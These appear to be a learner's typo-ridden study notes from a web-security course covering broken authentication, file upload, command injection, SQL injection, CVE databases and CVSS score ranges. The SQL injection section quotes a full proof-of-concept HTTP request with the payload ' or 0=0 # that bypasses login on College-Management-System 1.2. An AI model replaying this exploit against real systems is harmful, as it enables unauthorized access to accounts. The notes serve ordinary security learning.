# Common Web VUlnerabilires:

## Broken Auth/ Access Control:
Are among the most common and most dangerous VUlnerabilires for we app.
- Broken auth refers to vulnerability that allow attacker bypassing auth
funtions, this may allow attackers to login without having a valid ser of credential or allow a normal urser become the admin.
- Broken access control refers to vulnerabilities that allow attackers toa access pages and ft they should not have access to.
## Malicious File Upload:
Another common way to gain control over web app is through uploading malicius script, somo dev do perform checks and attems the validation
uploaded files, theshe cheks can often bypassed.
## Command Injection
Many Web app execute local Operating System commands to perform certain processes, type of [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
This vulnerability is widespread, as developers may not properly sanitize user user input or user weak test to do so, allowing attackers to bypassing
any checks or filtering.
## SQLINjection
Similar to command injection may be occur when the user app executers a SQLquery. Example:
```php
$query = "select * from users where name like '%$searchInput%'";
```
If a user input is not properly filtered and validatied, we may execute another SQL query alongside this query. Example:
```js
# Exploit Title: College-Management-System 1.2 - Authentication Bypass
# Author: Cakes
# Discovery Date: 2019-09-14
# Vendor Homepage: https://github.com/ajinkyabodade/College-Management-System
# Software Link: https://github.com/ajinkyabodade/College-Management-System/archive/master.zip
# Tested Version: 1.2
# Tested on OS: CentOS 7
# CVE: N/A

# Discription:
# Easy authentication bypass vulnerability on the application
# allowing the attacker to log in as the school principal.

# Simply replay the below Burp request or use Curl.
# Payload: ' or 0=0 #

POST /college/principalcheck.php HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://TARGET/college/principalcheck.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Cookie: PHPSESSID=9bcu5lvfilimmvfnkinqlc61l9; Logmon=ca43r5mknahus9nu20jl9qca0q
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1

emailid='%20or%200%3d0%20#&pass=asdf

```
# Public vulnerabilities:
As many organizations deploy web app thayt are publicly used, like open-source and propertary web app, these web app tend to be tested by many organizations
and expert.
CVE (Common Vulnerabilities and Exposures) record and score.
> [!TIP]
> Thhe first step is to identify the version of the web application. This can be found in many locations, like the source code of
> the web application. For open source web applications, we can check the repository of the web application and identify
> where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.

Pages to exploits
- Exploitdb
- Rapiod7 DB
- Vulnerability Lab.

## Common Vulnerability Scoring CVSS
Is a open-source industry standard for assessing the severity of security vulnerabilities, this scoring system is often used as a standard  measurement for organizations
and gobermnets.
The metris are; Base, Temporal and Eviromental.

- Base: metric produce ranging 0-10, modified by applying Temporal and Eviromental metrics. [NVD](https://nvd.nist.gov/) provides CVSS scores for almost.
The current scoring system in place are CVSS v2 and CVSS v3, several dff between the this two, namely changes to the Base and Eviromental for additional metrics.
CVSS V2.0 Ratings
Severity 	Base Score Range
Low 	    0.0-3.9
Medium 	    4.0-6.9
High 	    7.0-10.0
CVSS V3.0 Ratings
Severity 	Base Score Range
None 	    0.0
Low 	    0.1-3.9
Medium 	    4.0-6.9
High 	    7.0-8.9
Critical 	9.0-10.0
[link](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3/)
The NVD provides a CVSS v2 calculator and a CVSS v3 calculator that organizations can use to factor additional risk from Temporaland Environmental data unique to them.
The calculators are very interactive and can be used to fine-tune the CVSS score to our environment.

calculators:
[V2](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator)
[v3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
[Guide](https://www.first.org/cvss/user-guide)

## Backend Server Vulnerabilities:
The mos critial vulnerabilities for Backend components are found in web server, as they are publicly over the TCP protocol.
As for vulnerabilities in the back-end server or the database, they are usually utilized after gaining local access to the back-end server or back-end network, which may be gained through
external vulnerabilities or during internal penetration testing.
https://academy.hackthebox.com/achievement/349590/75
